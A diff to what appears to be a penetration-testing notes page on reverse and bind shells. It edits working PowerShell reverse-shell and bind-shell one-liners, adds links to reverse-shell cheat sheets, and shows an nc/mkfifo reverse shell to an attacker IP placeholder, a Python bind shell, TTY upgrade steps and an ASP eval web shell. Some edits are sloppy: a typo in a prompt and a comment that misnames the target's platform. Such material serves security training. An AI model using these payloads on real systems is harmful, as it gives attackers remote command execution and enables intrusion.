@@ -29,10 +29,18 @@ $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENEI
 {% endtab %}
 {% endtabs %}
 
+Other resources online will be helpful in other cases if we need another programming language to execute the script/code not only bash or PHP or even if the payloads above don't work.
+
+{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools" %}
+
+{% embed url="https://www.revshells.com/" %}
+
+{% embed url="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}
+
 #### Windows Target:
 
 ```powershell
-> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('1.1.1.1',PORT);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+target-host> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('1.1.1.1',PORT);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
 ### Setting up a listener on our attacking machine:
@@ -74,11 +82,10 @@ victim@target$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ```bash
 victim@target-host$ ^Z
-attacker@attacking-machine$ stty raw -echo
-attacker@attacking-machine$ fg
+attacker@attacking-machine$ stty raw -echo && fg
 [Enter]
 [Enter]
-user@target$
+victim@target-host$
 ```
 
 {% hint style="info" %}
@@ -112,7 +119,7 @@ $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 {% tabs %}
 {% tab title="PowerShell" %}
 ```powershell
-$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+atrget-host> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 ```
 {% endtab %}
 
@@ -128,7 +135,7 @@ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.S
 ```bash
 $ nc 10.10.10.10 1234
 # Successful connection a shell is now open:
-victim@target-host> id # our command
+victim@target-host> id # Our command, since this is a windows target we should inject a cmdlet
 uid=33(www-data) gid=33(www-data) groups=33(www-data) # server response
 ```
 
@@ -156,7 +163,6 @@ We <mark style="color:green;">successfully</mark> got a remote shell on the targ
 {% tab title="ASP" %}
 ```aspnet
 <% eval request("cmd") %>
-
 ```
 {% endtab %}
 {% endtabs %}
